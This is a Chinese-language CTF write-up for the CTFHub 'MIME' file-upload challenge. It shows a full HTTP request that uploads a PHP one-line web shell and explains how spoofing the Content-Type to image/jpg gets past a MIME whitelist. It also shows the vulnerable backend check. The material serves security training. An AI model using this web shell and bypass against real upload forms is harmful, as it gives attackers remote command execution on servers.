# CTFHUB_MIME

## 题目内容

![image-20210825042552264](/home/adian/note/Study_Note/网络安全/CTF/pic/27.png)


## WriteUp

源码中无任何提示

```
POST / HTTP/1.1
Host: challenge-758dce93ffeb8b77.sandbox.ctfhub.com:10800
Content-Length: 320
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-758dce93ffeb8b77.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz9K5GcuQL26LE7Ub
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://challenge-758dce93ffeb8b77.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17b672c96fe74f-01ab585fa1d62c-3d740e5b-1fa400-17b672c96ff412
Connection: close

------WebKitFormBoundaryz9K5GcuQL26LE7Ub
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php @eval($_POST['cmd']); ?>

------WebKitFormBoundaryz9K5GcuQL26LE7Ub
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryz9K5GcuQL26LE7Ub--
```

首先还是尝试一下htaccess绕过，这次htaccess文件上传被拦截，尝试更改mime

将`application/x-php`更改为`image/jpg`上传成功，成功连接拿到flag

查看后端代码

```php
if (!empty($_POST['submit'])) {
    if (!in_array($_FILES['file']['type'], ["image/jpeg", "image/png", "image/gif", "image/jpg"])) {
        echo "<script>alert('文件类型不正确')</script>";
    } else {
        $name = basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name)) {
            echo "<script>alert('上传成功')</script>";
            echo "上传文件相对路径<br>" . UPLOAD_URL_PATH . $name;
        } else {
            echo "<script>alert('上传失败')</script>";
        }
    }
}
```

原来是文件类型白名单
